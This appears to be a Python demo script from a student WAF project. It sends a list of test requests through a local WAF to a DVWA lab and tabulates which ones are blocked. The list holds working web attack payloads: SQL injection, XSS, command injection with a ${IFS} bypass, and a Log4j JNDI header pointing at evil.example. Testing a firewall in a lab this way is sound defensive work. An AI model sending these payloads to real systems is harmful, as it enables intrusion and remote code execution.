# -*- coding: utf-8 -*-
"""演示脚本：一次性把六类 Payload 打给 WAF，打印拦截结果表。

运行方式，需先启动 WAF 且靶场可访问：
    python tools/demo.py --waf http://127.0.0.1:8080

用途：演示现场不必手敲大量 URL，一条命令跑完全部类别；
输出表格便于现场观察每条 Payload 的处置结果。
只依赖 Python 标准库，不需要安装任何包。
"""

import argparse
import json
import urllib.error
import urllib.request

# 每项依次为：类别、位置、名称、方法、路径、请求体、额外请求头
PAYLOADS = [
    ("SQL注入", "url",
     "UNION SELECT 联合查询", "GET",
     "/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,2,3--&Submit=Submit",
     None, {}),
    ("SQL注入", "url",
     "时间盲注 SLEEP(5)", "GET",
     "/dvwa/vulnerabilities/sqli/?id=1%27%20and%20sleep(5)--&Submit=Submit",
     None, {}),
    ("XSS", "url",
     "script 标签弹窗", "GET",
     "/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E",
     None, {}),
    ("XSS", "url",
     "img onerror 事件", "GET",
     "/dvwa/vulnerabilities/xss_r/?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
     None, {}),
    ("命令注入", "url",
     "分号执行 whoami", "GET",
     "/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3Bwhoami&Submit=Submit",
     None, {}),
    ("命令注入", "url",
     "绕过：${IFS} 代替空格", "GET",
     "/dvwa/vulnerabilities/exec/?ip=127.0.0.1%24%7BIFS%7Dwhoami&Submit=Submit",
     None, {}),
    ("代码注入", "header",
     "Log4j JNDI 注入", "GET",
     "/dvwa/index.php", None, {"X-Api-Version": "${jndi:ldap://evil.example/a}"}),
    ("代码注入", "url",
     "Python eval 执行", "GET",
     "/dvwa/vulnerabilities/sqli/?id=eval(%221%2B1%22)&Submit=Submit",
     None, {}),
    ("XSS", "cookie",
     "cookie 中的 script", "GET",
     "/dvwa/index.php", None, {"Cookie": "PHPSESSID=demo123; note=<script>alert(1)</script>"}),
    ("正常流量", "url",
     "DVWA 首页（应放行）", "GET", "/dvwa/login.php", None, {}),
]


def send(waf, method, path, body=None, headers=None):
    url = waf.rstrip("/") + path
    data = body.encode("utf-8") if body else None
    request = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(request, timeout=10) as resp:
            return resp.status, len(resp.read())
    except urllib.error.HTTPError as exc:
        return exc.code, len(exc.read())
    except Exception as exc:
        return 0, str(exc)


def main():
    parser = argparse.ArgumentParser(description="课程设计 WAF 演示脚本")
    parser.add_argument("--waf", default="http://127.0.0.1:8080", help="WAF 地址")
    args = parser.parse_args()

    print(f"WAF 地址：{args.waf}")
    print("=" * 92)
    header = f"{'类别':<8}{'位置':<7}{'Payload':<26}{'状态码':<7}{'结果':<6}{'命中规则'}"
    print(header)
    print("-" * 92)

    blocked = allowed = 0
    for category, location, name, method, path, body, headers in PAYLOADS:
        status, _ = send(args.waf, method, path, body, headers)
        verdict = "拦截" if status == 403 else ("放行" if status else "失败")
        if status == 403:
            blocked += 1
        elif status:
            allowed += 1

        hit_rule = "-"
        if status == 403:
            hit_rule = _last_rule(args.waf)

        print(f"{category:<8}{location:<7}{name:<26}{status:<7}{verdict:<6}{hit_rule}")

    print("-" * 92)
    print(f"合计：拦截 {blocked} 条，放行 {allowed} 条")
    print(f"控制台：{args.waf}/__waf/console")
    return 0


def _last_rule(waf):
    """从日志接口取最近一次拦截命中的规则 ID，用于表格展示。"""
    try:
        with urllib.request.urlopen(waf.rstrip("/") + "/__waf/api/logs?limit=1", timeout=5) as resp:
            items = json.loads(resp.read().decode("utf-8"))["items"]
        if not items:
            return "-"
        hits = items[-1].get("hits") or []
        return ", ".join(h["rule_id"] for h in hits[:3]) or "-"
    except Exception:
        return "-"


if __name__ == "__main__":
    raise SystemExit(main())
